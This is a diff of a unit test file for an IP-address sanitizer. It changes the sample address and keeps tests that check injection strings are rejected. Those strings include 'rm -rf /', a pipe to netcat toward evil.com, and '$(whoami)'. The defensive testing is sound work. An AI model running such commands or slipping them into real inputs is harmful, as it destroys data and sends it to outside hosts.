@@ -14,7 +14,7 @@ import {
 
 describe('sanitizeIPAddress', () => {
   it('should accept valid IPv4 addresses', () => {
-    expect(sanitizeIPAddress('192.168.1.1')).toBe('192.168.1.1');
+    expect(sanitizeIPAddress('192.168.0.1')).toBe('192.168.0.1');
     expect(sanitizeIPAddress('10.0.0.1')).toBe('10.0.0.1');
     expect(sanitizeIPAddress('172.16.0.1')).toBe('172.16.0.1');
     expect(sanitizeIPAddress('255.255.255.255')).toBe('255.255.255.255');
@@ -30,9 +30,9 @@ describe('sanitizeIPAddress', () => {
   });
 
   it('should reject command injection attempts', () => {
-    expect(() => sanitizeIPAddress('192.168.1.1; rm -rf /')).toThrow();
-    expect(() => sanitizeIPAddress('192.168.1.1 && malicious')).toThrow();
-    expect(() => sanitizeIPAddress('192.168.1.1 | nc evil.com')).toThrow();
+    expect(() => sanitizeIPAddress('192.168.0.1; rm -rf /')).toThrow();
+    expect(() => sanitizeIPAddress('192.168.0.1 && malicious')).toThrow();
+    expect(() => sanitizeIPAddress('192.168.0.1 | nc evil.com')).toThrow();
     expect(() => sanitizeIPAddress('$(whoami)')).toThrow();
     expect(() => sanitizeIPAddress('`ls`')).toThrow();
   });
